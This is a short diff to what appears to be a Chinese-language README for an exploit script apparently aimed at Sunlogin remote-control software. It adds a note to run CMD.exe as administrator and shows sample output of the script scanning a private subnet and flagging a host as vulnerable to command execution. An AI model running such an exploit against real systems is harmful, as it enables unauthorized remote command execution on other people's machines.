@@ -13,6 +13,7 @@
 
 执行情况:
 ```
+(管理员权限启动CMD.exe)
 PS D:\> python .\sunlogin_exp_for_tututu.py
 2022-07-10 10:52:21-172.17.8.0/23
 [+]host:http://172.17.8.99:61127 cid:hHdXNeZi8NrH5cOND9JVsawf5lysf97y cmd:"vulnerable!" response:vulnerable! 
